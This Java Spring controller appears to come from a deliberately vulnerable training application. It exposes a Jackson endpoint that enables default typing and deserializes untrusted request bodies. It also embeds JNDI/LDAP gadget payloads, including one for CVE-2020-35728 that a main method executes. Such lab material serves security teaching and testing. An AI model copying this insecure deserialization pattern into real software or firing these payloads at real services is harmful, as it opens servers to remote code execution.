package com.best.hello.controller.ComponentsVul;

import com.fasterxml.jackson.databind.ObjectMapper;
import io.swagger.annotations.Api;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@Api("Jackson反序列化漏洞")
@RestController
@RequestMapping("/vulnapi/Jackson")
public class JacksonVul {

    @RequestMapping("/vul")
    public String vul(@RequestBody String content) {
        try {
            // String payload = "[\"com.nqadmin.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":\"true\"}]";

            ObjectMapper mapper = new ObjectMapper();
            mapper.enableDefaultTyping();
            System.out.println(content);
            //mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
            Object o = mapper.readValue(content, Object.class);
            mapper.writeValueAsString(o);
            return "Jackson RCE";
        } catch (Exception e) {
            e.printStackTrace();
            return "Jackson RCE ..";
        }
    }


    /**
     * CVE-2020-35728
     * com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool组件库存在不安全的反序列化
     */
    public static void main(String[] args) throws Exception {
        String payload = "[\"com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool\",{\"jndiPath\":\"ldap://127.0.0.1:1389/zrnug1\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object obj = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(obj);
    }
}











